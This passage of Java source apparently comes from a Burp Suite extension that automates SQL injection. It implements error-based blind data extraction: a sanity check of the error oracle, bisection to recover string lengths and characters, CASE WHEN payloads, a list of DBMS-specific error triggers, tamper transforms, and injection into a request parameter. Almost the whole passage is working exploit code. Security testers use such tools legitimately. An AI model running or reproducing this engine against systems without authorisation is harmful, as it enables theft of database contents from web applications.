     * Extract string length using inference bisection.
     */
    private int extractLengthInference(String query) {
        String lengthExpr = dialect.lengthFunction(query);

        // First verify the error oracle works: test a trivially true condition
        boolean sanityTrue = testErrorCondition("1=1");
        boolean sanityFalse = testErrorCondition("1=2");
        callback.onProgress("ERROR-INFERENCE: Sanity check: 1=1→" + sanityTrue +
                " 1=2→" + sanityFalse, 16);
        if (!sanityTrue || sanityFalse) {
            // Try with/without -- - (detection may have picked the wrong suffix)
            String altSuffix = workingSuffix.isEmpty() ? dialect.commentSuffix() : "";
            String origSuffix = workingSuffix;
            workingSuffix = altSuffix;

            sanityTrue = testErrorCondition("1=1");
            sanityFalse = testErrorCondition("1=2");
            callback.onProgress("ERROR-INFERENCE: Retry with suffix=\"" +
                    (altSuffix.isEmpty() ? "(none)" : altSuffix) + "\": 1=1→" +
                    sanityTrue + " 1=2→" + sanityFalse, 16);

            if (!sanityTrue || sanityFalse) {
                workingSuffix = origSuffix;
                callback.onProgress("ERROR-INFERENCE: Sanity check FAILED! Error oracle not working. " +
                        "Expected true/false but got " + sanityTrue + "/" + sanityFalse, 0);
                return -1;
            }
            callback.onProgress("ERROR-INFERENCE: Suffix corrected to \"" +
                    (altSuffix.isEmpty() ? "(none)" : altSuffix) + "\"", 0);
        }

        // Verify the query returns data: LENGTH(query) > 0
        boolean hasData = testErrorCondition(lengthExpr + ">0");
        if (!hasData) {
            callback.onProgress("ERROR-INFERENCE: Query returns no data (LENGTH <= 0)", 0);
            return 0;
        }

        int low = 0, high = 64;

        while (!cancelled) {
            if (testErrorCondition(lengthExpr + ">" + high)) {
                high *= 2;
                if (high > 2048) return -1;
            } else {
                break;
            }
        }

        while (low < high && !cancelled) {
            int mid = (low + high) / 2;
            if (testErrorCondition(lengthExpr + ">" + mid)) {
                low = mid + 1;
            } else {
                high = mid;
            }
        }

        callback.onProgress("ERROR-INFERENCE: Detected length=" + low, 18);
        return low;
    }

    /**
     * Extract ASCII value at a position using tiered adaptive bisection.
     * Same tiers as BlindExtractor: lowercase → digits → full ASCII.
     */
    private int extractCharAtPositionInference(String query, int position) {
        String asciiExpr = dialect.asciiAtPosition("(" + query + ")", position);

        // Tier 1: lowercase letters
        int result = bisectInRangeInference(asciiExpr, 97, 122);
        if (result > 0) return result;

        // Tier 2: digits
        result = bisectInRangeInference(asciiExpr, 48, 57);
        if (result > 0) return result;

        // Tier 3: full printable ASCII
        return bisectFullInference(asciiExpr, ASCII_MIN, ASCII_MAX);
    }

    private int bisectInRangeInference(String asciiExpr, int low, int high) {
        if (!testErrorCondition(asciiExpr + ">=" + low + " AND " + asciiExpr + "<=" + high)) {
            return -1;
        }
        return bisectFullInference(asciiExpr, low, high);
    }

    private int bisectFullInference(String asciiExpr, int low, int high) {
        while (low < high && !cancelled) {
            int mid = (low + high) / 2;
            if (testErrorCondition(asciiExpr + ">" + mid)) {
                low = mid + 1;
            } else {
                high = mid;
            }
        }
        return cancelled ? -1 : low;
    }

    /**
     * Test a boolean condition using error-based inference.
     * Uses CASE WHEN: condition true → 1 (no error) / condition false → error trigger.
     *
     * DBMS-specific error triggers that reliably cause SQL errors:
     * - MySQL: (SELECT 1 UNION SELECT 2) → "Subquery returns more than 1 row"
     * - PostgreSQL: CAST('a' AS INT) → "invalid input syntax for type integer"
     * - MSSQL: 1/0 → "Divide by zero"
     * - Oracle: 1/0 → "ORA-01476: divisor is equal to zero"
     * - SQLite: (SELECT 1 UNION SELECT 2) → subquery error
     */
    private boolean testErrorCondition(String condition) {
        // Uses the error trigger that was PROVEN to work during detect().
        // No hardcoded DBMS assumptions — works regardless of dialect.
        String trigger = workingErrorTrigger;
        if (trigger == null) return false;

        // CASE WHEN: TRUE → THEN 1 (no error, 200) / FALSE → ELSE trigger (error, 500)
        String caseExpr = "(CASE WHEN (" + condition + ") THEN 1 ELSE " + trigger + " END)";
        String payload = " " + workingOperator + " " + caseExpr + "=1 ";
        payload = TamperEngine.apply(payload, config.getTampers());

        var response = sendPayload(payload);
        if (response == null) return false;

        String body = response.bodyToString();
        int statusCode = response.statusCode();
        boolean isTrue = analyzer.isTruePage(inferTrueBaseline, inferFalseBaseline, body, statusCode);
        return isTrue;
    }

    /**
     * Detect which error trigger actually works on this target by testing each candidate.
     * Sends CASE WHEN 1=1 THEN 1 ELSE trigger END (should be true/200) and
     * CASE WHEN 1=2 THEN 1 ELSE trigger END (should be false/500).
     * Returns the first trigger that produces the correct status split.
     *
     * DBMS-agnostic: doesn't rely on dialect.getName(). Tries all known triggers
     * and uses whichever one works. This handles DBMS misdetection gracefully.
     */
    private String detectWorkingErrorTrigger(int expectedTrueStatus, int expectedFalseStatus) {
        // Candidate triggers ordered by universality, matching sqlmap's boolean_blind.xml.
        // Each is tested with CASE WHEN to find one that produces 200/500 split.
        String[] triggers = {
                "1/(SELECT 0)",                                     // PG, MSSQL, MySQL — division by zero
                "CAST(1 AS INT)/(SELECT 0 FROM DUAL)",              // Oracle — sqlmap's preferred Oracle trigger
                "1/(SELECT 0 FROM DUAL)",                           // Oracle — alt division by zero
                "(SELECT 1 UNION SELECT 2)",                        // MySQL, SQLite — multi-row subquery
                "1*(SELECT 1 UNION ALL SELECT 2)",                  // MSSQL — sqlmap's preferred MSSQL trigger
                "(SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL)",    // Oracle — multi-row subquery
                "EXP(710)",                                         // MySQL 5.5+ — DOUBLE overflow
                "CAST(CHR(113) AS NUMERIC)",                        // PostgreSQL — type conversion error
                "JSON(CHAR(65))",                                   // SQLite 3.9+ — invalid JSON
                "ZEROBLOB(-1)",                                     // SQLite — negative size
                "COTH(0)",                                          // MySQL 8.0+ — math error
                "1/0",                                              // generic — some DBMS allow bare division
        };

        for (String trigger : triggers) {
            if (cancelled) return null;

            // Test TRUE condition: CASE WHEN 1=1 → should NOT trigger error → expectedTrueStatus
            String trueCase = "(CASE WHEN (1=1) THEN 1 ELSE " + trigger + " END)";
            String truePayload = " " + workingOperator + " " + trueCase + "=1 ";
            truePayload = TamperEngine.apply(truePayload, config.getTampers());
            var trueResp = sendPayload(truePayload);
            if (trueResp == null) continue;
            int trueStatus = trueResp.statusCode();

            // Test FALSE condition: CASE WHEN 1=2 → should trigger error → expectedFalseStatus
            String falseCase = "(CASE WHEN (1=2) THEN 1 ELSE " + trigger + " END)";
            String falsePayload = " " + workingOperator + " " + falseCase + "=1 ";
            falsePayload = TamperEngine.apply(falsePayload, config.getTampers());
            var falseResp = sendPayload(falsePayload);
            if (falseResp == null) continue;
            int falseStatus = falseResp.statusCode();

            callback.onProgress("ERROR: Trigger probe \"" + trigger + "\" → " +
                    "1=1:" + trueStatus + " 1=2:" + falseStatus +
                    " (expect " + expectedTrueStatus + "/" + expectedFalseStatus + ")", 9);

            // Success: true condition matches true baseline, false condition differs
            if (trueStatus == expectedTrueStatus && falseStatus != expectedTrueStatus) {
                callback.onProgress("ERROR: Working trigger found: " + trigger, 9);
                return trigger;
            }
        }

        return null;
    }

    /**
     * HTML-unescape a string. Like sqlmap's htmlUnescape() — decodes HTML entities
     * that servers commonly use when rendering error messages in HTML pages.
     * Handles both named entities (&amp;, &lt;, &gt;, &quot;, &#039;) and
     * numeric entities (&#NNN; and &#xHH;).
     */
    private static String htmlUnescape(String s) {
        if (s == null || !s.contains("&")) return s;
        // Named entities
        s = s.replace("&amp;", "&");
        s = s.replace("&lt;", "<");
        s = s.replace("&gt;", ">");
        s = s.replace("&quot;", "\"");
        s = s.replace("&#039;", "'");
        s = s.replace("&apos;", "'");
        s = s.replace("&#x27;", "'");
        s = s.replace("&#x2F;", "/");
        s = s.replace("&nbsp;", " ");
        // Numeric entities: &#NNN; and &#xHH;
        java.util.regex.Matcher numMatcher = Pattern.compile("&#(\\d+);").matcher(s);
        StringBuilder sb = new StringBuilder();
        while (numMatcher.find()) {
            try {
                int codePoint = Integer.parseInt(numMatcher.group(1));
                numMatcher.appendReplacement(sb, java.util.regex.Matcher.quoteReplacement(
                        String.valueOf((char) codePoint)));
            } catch (NumberFormatException e) {
                // leave as-is
            }
        }
        numMatcher.appendTail(sb);
        s = sb.toString();
        // Hex entities: &#xHH;
        java.util.regex.Matcher hexMatcher = Pattern.compile("&#x([0-9a-fA-F]+);").matcher(s);
        sb = new StringBuilder();
        while (hexMatcher.find()) {
            try {
                int codePoint = Integer.parseInt(hexMatcher.group(1), 16);
                hexMatcher.appendReplacement(sb, java.util.regex.Matcher.quoteReplacement(
                        String.valueOf((char) codePoint)));
            } catch (NumberFormatException e) {
                // leave as-is
            }
        }
        hexMatcher.appendTail(sb);
        return sb.toString();
    }

    /**
     * Reverse Oracle XMLType REPLACE() escapes after extraction.
     * Like sqlmap: XMLType payloads use REPLACE() to substitute space, $, @, # with safe tokens
     * before XML parsing. After extraction, reverse these substitutions to recover original data.
     * Only applies when dialect is Oracle and the working error function is XMLType (level 1).
     */
    private String reverseXmlTypeReplace(String extracted) {
        if (extracted == null) return null;
        // Only apply to Oracle XMLType (first error function, level 1)
        if (!"Oracle".equals(dialect.getName())) return extracted;
        if (workingErrorFunction == null || !workingErrorFunction.contains("XMLType")) return extracted;

        // Reverse the REPLACE tokens (case-insensitive since UPPER() was applied)
        extracted = extracted.replace(OracleDialect.XML_SPACE_TOKEN.toUpperCase(), " ");
        extracted = extracted.replace(OracleDialect.XML_DOLLAR_TOKEN.toUpperCase(), "$");
        extracted = extracted.replace(OracleDialect.XML_AT_TOKEN.toUpperCase(), "@");
        extracted = extracted.replace(OracleDialect.XML_HASH_TOKEN.toUpperCase(), "#");
        // Also try original case (in case UPPER() wasn't applied)
        extracted = extracted.replace(OracleDialect.XML_SPACE_TOKEN, " ");
        extracted = extracted.replace(OracleDialect.XML_DOLLAR_TOKEN, "$");
        extracted = extracted.replace(OracleDialect.XML_AT_TOKEN, "@");
        extracted = extracted.replace(OracleDialect.XML_HASH_TOKEN, "#");
        return extracted;
    }

    /** Whether this extractor is operating in inference mode (behavioral, not error-text) */
    public boolean isInferenceMode() { return inferenceMode; }

    /**
     * Send a request with the payload injected using the stored working boundary.
     * Used during extraction phase (after detect() has found a working boundary).
     */
    private burp.api.montoya.http.message.responses.HttpResponse sendPayload(String payload) {
        return sendPayloadWith(payload, workingPrefix, workingSuffix);
    }

    /**
     * Send a request with the payload injected using a specific boundary.
     * Used during detection phase to try different prefix/suffix combinations.
     */
    private burp.api.montoya.http.message.responses.HttpResponse sendPayloadWith(
            String payload, String prefix, String suffix) {
        try {
            HttpRequest req = PayloadInjector.inject(originalRequest.request(),
                    config.getParameterName(), config.getParameterType(),
                    prefix + payload + (suffix.isEmpty() ? "" : suffix));
            long start = System.currentTimeMillis();
            HttpRequestResponse rr = api.http().sendRequest(req);
            long elapsed = System.currentTimeMillis() - start;
            result.incrementRequestCount();
            callback.onRequestSent(rr, payload, "ERROR", elapsed);
            return rr.response();
        } catch (Exception e) {
            return null;
        }
    }
}
